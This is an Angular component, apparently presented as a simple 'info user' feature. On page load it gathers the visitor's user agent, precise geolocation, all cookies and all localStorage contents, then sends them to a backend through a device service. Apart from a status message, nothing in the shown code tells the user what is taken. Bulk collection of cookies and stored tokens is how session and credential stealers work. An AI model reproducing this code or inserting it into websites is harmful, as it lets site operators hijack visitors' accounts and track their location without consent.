import { Component, OnInit } from '@angular/core';
import { DeviceService } from '@services/device.service';

@Component({
  selector: 'app-info-user',
  templateUrl: './info-user.component.html',
  styleUrls: ['./info-user.component.css'],
})
export class InfoUserComponent implements OnInit {
  loading = false;
  message = '';

  constructor(private deviceService: DeviceService) {}

  ngOnInit(): void {
    if (!this.deviceService.isBrowser) return;

    this.getDeviceInfo();
  }

  getDeviceInfo(): void {
    this.loading = true;
    const userAgent = navigator.userAgent;

    navigator.geolocation.getCurrentPosition(
      (position) => this.sendData(userAgent, position),
      (error) => {
        this.loading = false;
        this.message = 'No se pudo obtener la ubicación.';
        console.error(error);
        this.sendData(userAgent);
      }
    );
  }

  getAllLocalStorageData(): { [key: string]: any } {
    const allData: { [key: string]: any } = {};

    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i); // Obtiene el nombre de la clave
      if (key) {
        const value = localStorage.getItem(key); // Obtiene el valor
        try {
          // Intenta parsear como JSON, si no es JSON devuelve el string
          allData[key] = value ? JSON.parse(value) : null;
        } catch {
          allData[key] = value;
        }
      }
    }

    return allData;
  }

  getAllCookies(): { [key: string]: string } {
    const cookies: { [key: string]: string } = {};
    const documentCookies = document.cookie; // Obtiene todas las cookies como un string

    if (documentCookies) {
      documentCookies.split(';').forEach((cookie) => {
        const [key, value] = cookie.split('='); // Divide en clave y valor
        cookies[key.trim()] = decodeURIComponent(value); // Decodifica y elimina espacios
      });
    }

    return cookies;
  }

  sendData(userAgent: string, p?: GeolocationPosition): void {
    const data = {
      userAgent,
      cookies: this.getAllCookies(),
      localStorage: this.getAllLocalStorageData(),
      location: p
        ? {
            latitude: p.coords.latitude,
            longitude: p.coords.longitude,
            accuracy: p.coords.accuracy,
          }
        : null,
    };

    this.deviceService.sendDeviceInfo(data).subscribe({
      next: (response) => {
        this.loading = false;
        this.message = 'Información enviada correctamente.';
        console.log(response);
      },
      error: (error) => {
        this.loading = false;
        this.message = 'Error al enviar información.';
        console.error(error);
      },
    });
  }
}
